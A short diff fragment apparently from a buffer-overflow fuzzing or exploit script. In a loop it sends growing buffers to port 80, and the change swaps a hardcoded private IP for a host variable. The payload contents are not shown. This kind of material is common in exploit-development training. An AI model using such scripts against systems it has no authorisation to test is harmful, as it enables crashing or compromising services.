@@ -34,7 +34,7 @@ while(size < 2000):
   try:
     print("Sending Buffer" + " " + str(size))
     s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("192.168.127.10", 80))
+    s.connect((host, 80))
     s.send(payload)
     '''while True:
       data = s.recv(4096)
